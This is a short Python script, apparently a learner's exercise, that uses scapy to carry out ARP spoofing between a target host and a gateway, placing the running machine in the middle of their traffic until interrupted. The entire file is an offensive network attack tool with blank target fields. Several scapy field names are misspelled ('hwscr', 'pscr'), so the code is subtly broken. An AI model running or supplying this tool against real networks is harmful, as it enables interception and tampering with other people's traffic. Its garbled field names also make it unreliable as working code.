#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwscr

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, pscr=spoof_ip)
    scapy.send(packet, verbose=False)

def retore(destination_ip, scource_ip):
    destination_mac = get_mac(destination_ip)
    scource_mac = get_mac(scource_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, pscr=scource_ip, hwscr=scource_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = ""
gateway_ip = ""

try:
    sent_packet_count = 0
    while True:
        spoof(target_ip , gateway_ip)
        spoof(gateway_ip,target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packet Sent : " + str(sent_packet_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] Quiting by Ctrl + c , Restoreing please wait...")
    retore(target_ip, gateway_ip)
    retore(gateway_ip, target_ip)